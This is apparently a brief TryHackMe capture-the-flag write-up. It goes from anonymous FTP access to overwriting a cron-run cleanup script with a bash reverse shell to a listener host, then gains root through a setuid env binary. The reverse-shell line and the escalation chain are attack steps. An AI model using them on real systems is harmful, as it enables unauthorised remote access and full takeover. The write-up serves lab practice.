Easy Tryhackme Box

## Recon

I did an nmap scan on the box that revealed 4 open ports.

But the ftp port had anonymous login enabled which was very easy to exploit.
And the rest were ok.

## Enumeration

I tried enumerating for shares on the ports 139, 445 for smb shares.

`smbclient -L //HOST-IP/ -N`

This gives me shares with the names of `pics`. 

Logging into them as user and downloading those pictures thinking it might have some steg involved ended up as a rabbit hole.

So I logged into the ftp on port 21 under creds : `anonymous:anonymous`

## Exploit

There are 3 files in the ftp server. one of them is just a to_do.txt and irrelevant.

There is a `clean.sh` and a `removed_files.log` file.

Looking at the `clean.sh` file, it seems it checks if any files are present in the tmp folder and logs them into `removed_files.log` file.

So this must be a cronjob type script that executes itself after a certain time interval.

So I changed the script to a bash reverse shell using `!nano` command and started a listener on my local machine.

`bash -i >& /dev/tcp/VPN-IP/9999 0>&1`

And so after some time, we get a shell as the user `namelessone`.

## Priv Esc

I used the `find` command to find any setuids that I can use for priv esc.

I found the setuid `/usr/bin/env`.

Using the command from gtfobins for [env](https://gtfobins.github.io/gtfobins/env/).

We can get direct root access. Now we can go ahead and read both user and root flags.